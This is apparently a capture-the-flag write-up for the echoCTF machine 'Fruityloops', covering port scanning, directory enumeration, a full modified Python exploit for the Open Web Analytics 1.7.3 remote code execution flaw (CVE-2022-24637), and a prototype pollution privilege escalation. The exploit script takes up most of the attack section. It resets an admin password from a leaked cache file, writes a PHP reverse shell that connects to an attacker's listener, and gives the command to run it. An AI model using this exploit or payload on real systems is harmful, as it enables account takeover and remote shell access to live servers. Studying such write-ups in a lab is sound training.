---
description: >-
  Fruityloops echoCTF Machine
title: Fruityloops (Intermediate)                # Add title here
date: 2025-02-21 08:00:00 -0600                           # Change the date to match completion date
categories: [echoCTF, Intermediate]                     # Change Templates to Writeup
tags: [SCR, Open Web Analytics, RCE, Prototype Pollution]     # TAG names should always be lowercase; replace template with writeup, and add relevant tags
show_image_post: true                                    # Change this to true
image: /assets/img/icons/Fruityloops.png                # Add infocard image here for post preview image
---
##### Host entries
```bash
10.0.160.239    fruityloops.echocity-f.com
```

### Content

- Open Web Analytics 1.7.3 - Remote Code Execution
- Source Code Review
- Prototype Pollution vulnerability affecting @apphp/object-resolver

### Reconnaissance

Initial reconnaissance for TCP ports
```bash
nmap -p- -sS --open --min-rate 500 -Pn -n -vvvv -oG allPorts 10.0.160.239
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.0.160.239 ()   Status: Up
Host: 10.0.160.239 ()   Ports: 22/open/tcp//ssh///, 80/open/tcp//http///
```
Services and Versions running:
```bash
nmap -p22,80 -sCV -n -Pn -vvvv -oN targeted 10.0.160.239
Nmap scan report for 10.0.160.239
Host is up, received user-set (0.17s latency).
Scanned at 2025-02-21 19:54:52 EST for 42s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 08:aa:23:e1:f1:fd:7e:dd:74:c4:0b:7f:a1:b0:06:6c (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDQYlZMiZDnvhA5SiBEIZvhYNOBHNUmEXnpSwkLZfdtW/c+NKomdyZar2J708zWuDbStZM5vnSuD1FqfHVOHBDV0dt5JqnB8KShpC4BNViJGGzlDTlsSEDXYRyHeFKgMUdnJX9vQQlfmhlL2HqYzx2An/HLABy/sm3O1r1GwHmnqo5Wy+gpQi/0g0kwUdkEWuuDXxWQNQN2PwQs19tE7XY21a6+eVDEUeN2egllPvUiD+mEmsQWkcj9Al9UYDAaUEzMLfISXI+wfePdv4cg3pNMDa6rRAm570leu29LfjXKPJIHX8mQfxfiPQ1HKDt0GaAsWyDO29lUtH4ZKk6Rsc/Ag81lX6FKDr8948CSQh2zxqgZxKcX/x0G+2BHtpeNhizWTNgHAnQN6xrv+tFbBwWNBmkNvj9Y6XF/aawnG4+YtOErFvRCRahVQEwEpdIsprvy2MmS+njaFsXrbDjvGbSKC65EDaFLkVpG4mpQzjraBr+mogwaqffvlnt7d6kDgL8=
|   256 12:fd:5e:1e:73:d4:c8:c1:5e:6a:5a:76:58:36:19:39 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILdxNUav6eRePpHBhNC0Ec7TzdcG4jcs5kSUEDqMhnE7
80/tcp open  http    syn-ack ttl 63 nginx 1.18.0
|_http-title: Elate &mdash; 100% Free Fully Responsive HTML5 Template
|_http-server-header: nginx/1.18.0
| http-methods: 
|_  Supported Methods: GET
```

### Exploitation
There is only HTTP port open which has a web page called Elate, however this seems to be a rabbit hole because there is no interesting information here, so i decided to execute a `dirsearch` command to explore the webpage:

```bash
dirsearch -u http://10.0.160.239/ 

Target: http://10.0.160.239/

[13:49:02] Starting: 
[13:49:17] 301 -  169B  - /js  ->  http://10.0.160.239/js/                  
[13:49:47] 301 -  169B  - /api  ->  http://10.0.160.239/api/                
[13:49:47] 200 -    0B  - /api/                                             
[13:49:55] 200 -  523B  - /composer.json                                    
[13:49:55] 301 -  169B  - /conf  ->  http://10.0.160.239/conf/              
[13:49:55] 200 -    5KB - /composer.lock                                    
[13:49:55] 200 -    0B  - /conf/                                            
[13:49:59] 200 -    1KB - /CONTRIBUTING.md                                  
[13:50:00] 301 -  169B  - /css  ->  http://10.0.160.239/css/                
[13:50:08] 301 -  169B  - /fonts  ->  http://10.0.160.239/fonts/            
[13:50:12] 301 -  169B  - /images  ->  http://10.0.160.239/images/          
[13:50:12] 403 -  555B  - /images/                                          
[13:50:12] 301 -  169B  - /includes  ->  http://10.0.160.239/includes/      
[13:50:12] 200 -    0B  - /includes/                                        
[13:50:12] 302 -    0B  - /index.php  ->  http://fruityloops.echocity-f.com/index.php?owa_do=base.loginForm&owa_go=http%3A%2F%2F10.0.160.239%2Findex.php&
[13:50:13] 302 -    3KB - /install.php  ->  http://fruityloops.echocity-f.com/
[13:50:13] 302 -    3KB - /install.php?profile=default  ->  http://fruityloops.echocity-f.com/
[13:50:15] 403 -  555B  - /js/                                              
[13:50:16] 200 -   42B  - /log.php                                          
[13:50:22] 200 -    0B  - /modules/                                         
[13:50:22] 301 -  169B  - /modules  ->  http://10.0.160.239/modules/
[13:50:30] 200 -    0B  - /plugins/                                         
[13:50:30] 301 -  169B  - /plugins  ->  http://10.0.160.239/plugins/        
[13:50:33] 200 -    3KB - /README.md
```

And there are some redirects towards `http://fruityloops.echocity-f.com/` which means we need to add it to our `/etc/hosts` file:

```bash
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters


10.0.160.239    fruityloops.echocity-f.com
```
The most interesting redirect is this one `http://fruityloops.echocity-f.com/index.php?owa_do=base.loginForm&owa_go=http%3A%2F%2F10.0.160.239%2Findex.php&` which provides a login page for a CMS called Open Web Analytics, after several attempts I was not able to find any default credentials, so I then proceed to do a further identification for the software running, such as the version, by checking the source code, there was a hint about the version (1.7.3):

```bash
<link rel="StyleSheet" href="http://fruityloops.echocity-f.com/modules/base/css/owa.css?version=1.7.3" type="text/css">
```

![](/assets/img/Pasted-image-20250221174219.png)

With this information, I can now search exploits, the only one for this version is vulnerable to [Open Web Analytics 1.7.3 - Remote Code Execution](https://www.exploit-db.com/exploits/51026), initially, this exploit does not work as expected, also while investigating I found a [metasploit exploit](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/open_web_analytics_rce.rb) that works for this vulnerability, however this is also not working, I then decided to understand the exploit.

There are two excellent resources to dig deeper on the details if you want to know, there is a machine on HTB Vessel and [0xdf explains on detail](https://0xdf.gitlab.io/2023/03/25/htb-vessel.html) about this exploit code, also he refers to the detailed explanation on [CVE-2022-24637](https://devel0pment.de/?p=2494) which is the flow of such script, your homework is to try and understand why I modified what I modified on this script, that resulted on a reverse shell:
```bash
# Exploit Title: Open Web Analytics 1.7.3 - Remote Code Execution (RCE)
# Date: 2022-08-30
# Exploit Author: Jacob Ebben
# Vendor Homepage: https://www.openwebanalytics.com/
# Software Link: https://github.com/Open-Web-Analytics
# Version: <1.7.4
# Tested on: Linux 
# CVE : CVE-2022-24637

import argparse
import requests
import base64
import re
import random
import string
import hashlib
from termcolor import colored

def print_message(message, type):
   if type == 'SUCCESS':
      print('[' + colored('SUCCESS', 'green') +  '] ' + message)
   elif type == 'INFO':
      print('[' + colored('INFO', 'blue') +  '] ' + message)
   elif type == 'WARNING':
      print('[' + colored('WARNING', 'yellow') +  '] ' + message)
   elif type == 'ALERT':
      print('[' + colored('ALERT', 'yellow') +  '] ' + message)
   elif type == 'ERROR':
      print('[' + colored('ERROR', 'red') +  '] ' + message)

def get_normalized_url(url):
   if url[-1] != '/':
      url += '/'
   if url[0:7].lower() != 'http://' and url[0:8].lower() != 'https://':
      url = "http://" + url
   return url

def get_proxy_protocol(url):
   if url[0:8].lower() == 'https://':
      return 'https'
   return 'http'

def get_random_string(length):
   chars = string.ascii_letters + string.digits
   return ''.join(random.choice(chars) for i in range(length))

def get_cache_content(cache_raw):
   regex_cache_base64 = r'/\*(.*?)\*/'
   regex_result = re.search(regex_cache_base64, cache_raw)
   if not regex_result:
      print_message('The provided URL does not appear to be vulnerable ...', "ERROR")
      exit()
   else:
      cache_base64 = regex_result.group(1)
   return base64.b64decode(cache_base64).decode("ascii")

def get_cache_username(cache):
   regex_cache_username = r'"user_id";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:5:"(\w*)"'
   return re.search(regex_cache_username, cache).group(1)

def get_cache_temppass(cache):
   regex_cache_temppass = r'"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"(\w*)"'
   return re.search(regex_cache_temppass, cache).group(1)

def get_update_nonce(url):
    try:
        update_nonce_request = session.get(url, proxies=proxies)
        
        # Debugging: Print response content to check if nonce is present
        print_message("Checking for nonce in response...", "INFO")
        
        regex_update_nonce = r'owa_nonce" value="(\w+)"'
        match = re.search(regex_update_nonce, update_nonce_request.text)

        if match is None:
            print_message("Failed to find 'owa_nonce' in response!", "ERROR")
            print("Response content:\n", update_nonce_request.text)  # Debugging
            exit()
        
        return match.group(1)

    except Exception as e:
        print_message("An error occurred when attempting to update config!", "ERROR")
        print(e)
        exit()

parser = argparse.ArgumentParser(description='Exploit for CVE-2022-24637: Unauthenticated RCE in Open Web Analytics (OWA)')
parser.add_argument('TARGET', type=str, 
                  help='Target URL (Example: http://localhost/owa/ or https://victim.xyz:8000/)')
parser.add_argument('ATTACKER_IP', type=str, 
                  help='Address for reverse shell listener on attacking machine')
parser.add_argument('ATTACKER_PORT', type=str, 
                  help='Port for reverse shell listener on attacking machine')
parser.add_argument('-u', '--username', default="admin", type=str,
                  help='The username to exploit (Default: admin)')
parser.add_argument('-p','--password', default=get_random_string(32), type=str,
                  help='The new password for the exploited user')
parser.add_argument('-P','--proxy', type=str,
                  help='HTTP proxy address (Example: http://127.0.0.1:8080/)')
parser.add_argument('-c', '--check', action='store_true',
                  help='Check vulnerability without exploitation')

args = parser.parse_args()

base_url = get_normalized_url(args.TARGET)
login_url = base_url + "index.php?owa_do=base.loginForm"
password_reset_url = base_url + "index.php?owa_do=base.usersPasswordEntry"
update_config_url = base_url + "index.php?owa_do=base.optionsGeneral"

username = args.username
new_password = args.password

reverse_shell = '<?php $sock=fsockopen("' + args.ATTACKER_IP + '",'+ args.ATTACKER_PORT + ');$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);?>'
shell_filename = get_random_string(8) + '.php'
shell_url = base_url + 'owa-data/caches/' + shell_filename

if args.proxy:
   proxy_url = get_normalized_url(args.proxy)
   proxy_protocol = get_proxy_protocol(proxy_url)
   proxies = { proxy_protocol: proxy_url }
else:
   proxies = {}

session = requests.Session()

try:
   mainpage_request = session.get(base_url, proxies=proxies)
except Exception as e:
   print_message('Could not connect to "' + base_url, "ERROR")
   exit()
else:
   print_message('Connected to "' + base_url + '" successfully!', "SUCCESS")

if 'Open Web Analytics' not in mainpage_request.text:
   print_message('Could not confirm whether this website is hosting OWA! Continuing exploitation...', "WARNING")
elif 'version=1.7.3' not in mainpage_request.text:
   print_message('Could not confirm whether this OWA instance is vulnerable! Continuing exploitation...', "WARNING")
else:
   print_message('The webserver indicates a vulnerable version!', "ALERT")

try:
   data = {
      "owa_user_id": username, 
      "owa_password": username, 
      "owa_action": "base.login"
   }
   session.post(login_url, data=data, proxies=proxies)
except Exception as e:
   print_message('An error occurred during the login attempt!', "ERROR")
   print(e)
   exit()
else:
   print_message('Attempting to generate cache for "' + username + '" user', "INFO")

print_message('Attempting to find cache of "' + username + '" user', "INFO")

found = False

for key in range(100):
   user_id = 'user_id' + str(key)
   userid_hash = hashlib.md5(user_id.encode()).hexdigest() 
   filename = userid_hash + '.php'
   cache_url = base_url + "owa-data/caches/" + str(key) + "/owa_user/" + filename
   cache_request = requests.get(cache_url, proxies=proxies)
   if cache_request.status_code != 200:
      continue;
   cache_raw = cache_request.text
   cache = get_cache_content(cache_raw)
   cache_username = get_cache_username(cache)
   if cache_username != username:
      print_message('The temporary password for a different user was found. "' + cache_username + '": ' + get_cache_temppass(cache), "INFO")
      continue;
   else:
      found = True
      break
if not found:
   print_message('No cache found. Are you sure "' + username + '" is a valid user?', "ERROR")
   exit()

cache_temppass = get_cache_temppass(cache)
print_message('Found temporary password for user "' + username + '": ' + cache_temppass, "INFO")

if args.check:
   print_message('The system appears to be vulnerable!', "ALERT")
   exit()

try:
   data = {
      "owa_password": new_password, 
      "owa_password2": new_password, 
      "owa_k": cache_temppass, 
      "owa_action": 
      "base.usersChangePassword"
   }
   session.post(password_reset_url, data=data, proxies=proxies)
except Exception as e:
   print_message('An error occurred when changing the user password!', "ERROR")
   print(e)
   exit()
else:
   print_message('Changed the password of "' + username + '" to "' + new_password + '"', "INFO")

try:
   data = {
      "owa_user_id": username, 
      "owa_password": new_password, 
      "owa_action": "base.login"
   }
   session.post(login_url, data=data, proxies=proxies)
except Exception as e:
   print_message('An error occurred during the login attempt!', "ERROR")
   print(e)
   exit()
else:
   print_message('Logged in as "' + username + '" user', "SUCCESS")

nonce = get_update_nonce(update_config_url)

try:
   log_location = "/var/www/html/owa-data/caches/" + shell_filename
   data = {
      "owa_nonce": nonce, 
      "owa_action": "base.optionsUpdate", 
      "owa_config[base.error_log_file]": log_location, 
      "owa_config[base.error_log_level]": 2
   }
   session.post(update_config_url, data=data, proxies=proxies)
except Exception as e:
   print_message('An error occurred when attempting to update config!', "ERROR")
   print(e)
   exit()
else:
   print_message('Creating log file', "INFO")

nonce = get_update_nonce(update_config_url)

try:
   data = {
      "owa_nonce": nonce, 
      "owa_action": "base.optionsUpdate", 
      "owa_config[shell]": reverse_shell 
   }
   session.post(update_config_url, data=data, proxies=proxies)
except Exception as e:
   print_message('An error occurred when attempting to update config!', "ERROR")
   print(e)
   exit()
else:
   print_message('Wrote payload to log file', "INFO")

try:
   session.get(shell_url, proxies=proxies)
except Exception as e:
   print(e)
else:
   print_message('Triggering payload! Check your listener!', "SUCCESS")
   print_message('You can trigger the payload again at "' + shell_url + '"' , "INFO")
```
To execute the exploit all we need to do is run this command:
```bash
python3 exploit.py -u admin -P 127.0.0.1:8080 http://fruityloops.echocity-f.com/ 10.10.5.122 1234
```
And we have a shell.

### Privilege Escalation

The privilege escalation was very straightforward, a binary that we can execute without password:
```bash
www-data@fruityloops:~/html/owa-data/caches$ sudo -l
Matching Defaults entries for www-data on fruityloops:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on fruityloops:
    (ALL : ALL) NOPASSWD: /usr/local/bin/fruityloops
```
And the content of the flatline binary is this:
```bash
#! /usr/bin/env node
var args = process.argv.slice(2);
(async () => {
  const { exec } = await import('child_process');
  const lib = await import('@apphp/object-resolver');
  var authentication = {}
  try {
    lib.setNestedProperty({}, args[0], true)
  } catch (e) { }
  if(authentication.success === true)
  {
    exec("/tmp/pwned");
  }
})();
```
As usual, the vulnerability relays on the imported library, in this case `@apphp/object-resolver`, there is a vulnerability reported as [Prototype Pollution vulnerability affecting @apphp/object-resolver](https://github.com/apphp/js-object-resolver/issues/1), after reading the article and with the aid of DeepSeek I came with the following payload:
```bash
www-data@fruityloops:/tmp$ sudo /usr/local/bin/fruityloops "__proto__.success"
www-data@fruityloops:/tmp$ ls -al /bin/bash
-rwsr-sr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```
And we ARE INSIDEEEE!!!

### Post Exploitation

Flags are stored at:

`/etc/passwd`
`/etc/shadow`
`/proc/1/environ`
`/root`

### Credentials

- The exploit allows to change the password from a given user, no credentials were identified for this machine.

### Notes

-  It is vital for a pentester to understand an exploit. Some public exploits do not work on certain environments because the requests are not the same, there are differences in the operating system, and so on. Our work is to gain a comprehensive understanding of what the exploit is doing and how it is doing it. Debugging is also crucial for reviewing what an exploit could be doing incorrectly and fixing it.

### References
- [Open Web Analytics 1.7.3 - Remote Code Execution](https://www.exploit-db.com/exploits/51026)
- [metasploit exploit](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/open_web_analytics_rce.rb)
- [0xdf explains on detail](https://0xdf.gitlab.io/2023/03/25/htb-vessel.html)
- [CVE-2022-24637](https://devel0pment.de/?p=2494)
- [Prototype Pollution vulnerability affecting @apphp/object-resolver](https://github.com/apphp/js-object-resolver/issues/1)



